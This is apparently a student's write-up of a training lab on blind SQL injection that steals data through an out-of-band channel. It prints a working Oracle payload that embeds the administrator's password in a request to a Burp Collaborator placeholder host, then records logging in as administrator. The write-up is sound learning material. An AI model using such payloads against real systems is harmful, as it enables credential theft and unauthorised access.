## Lab 10 — Blind SQL Injection with Out-of-Band Data Exfiltration

### Goal

Exploit a blind SQL injection vulnerability to retrieve the password of the
`administrator` user using an out-of-band interaction, then log in as the
administrator.

### What I Observed

The application:

* Used the `TrackingId` cookie inside an SQL query.
* Executed the SQL query asynchronously.
* Did not return the query results.
* Allowed the database to interact with an external domain.

Instead of using the OOB interaction only to confirm SQL execution, I used it
to **exfiltrate the administrator's password**.

### Technique

I used **Burp Collaborator** to generate a unique external domain and monitor
for interactions with it.

The idea was:

```text
SQL Injection
      ↓
Database executes injected SQL
      ↓
Retrieve administrator password
      ↓
Include password in external domain
      ↓
Database performs DNS/HTTP interaction
      ↓
Burp Collaborator receives the interaction
      ↓
Password is revealed
```

### Successful Payload

```text
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

I used Burp Collaborator to replace the `BURP-COLLABORATOR-SUBDOMAIN`
placeholder.

### Password Extraction

The important part of the payload was:

```sql
SELECT password FROM users WHERE username='administrator'
```

The returned password was concatenated into the external domain.

Conceptually:

```text
Administrator password
        ↓
External domain
        ↓
DNS/HTTP interaction
        ↓
Burp Collaborator
        ↓
Password revealed
```

### Result

The Collaborator tab showed DNS and HTTP interactions from the application.

The administrator password appeared in the generated domain.

I then used the recovered password to log in as:

```text
Username: administrator
Password: [recovered password]
```

**Lab solved.**

### What I Learned

* OOB SQLi can be used for **data exfiltration**, not only to confirm SQL
  execution.
* Sensitive data can be placed inside an external domain/request.
* Burp Collaborator can reveal the exfiltrated data through DNS/HTTP
  interactions.
* Asynchronous SQL execution means the interaction may take some time to
  appear.
* The exact OOB technique depends heavily on the database type and its
  available functionality.

### Difference From Previous OOB Lab

```text
Previous lab:
SQLi → External interaction → Confirm execution

This lab:
SQLi → Retrieve data → External interaction → Exfiltrate data
```

The main new concept was **using the OOB channel to extract actual database
data** instead of only proving that the SQL injection was executed.

### Key Takeaway

OOB SQL injection can provide an external information channel when the
application itself does not reveal the result of the injected SQL.

```text
SQL Injection
      ↓
Retrieve sensitive data
      ↓
External interaction
      ↓
Burp Collaborator
      ↓
Data exfiltration
```

### Learning Checklist

* [✅] Blind SQL injection
* [✅] Burp Collaborator
* [✅] OOB interaction
* [✅] Retrieve data using a SQL subquery
* [✅] Exfiltrate data through an external domain
* [✅] Recover the administrator password
* [✅] Log in as administrator
* [✅] Understand the difference between OOB confirmation and OOB data exfiltration
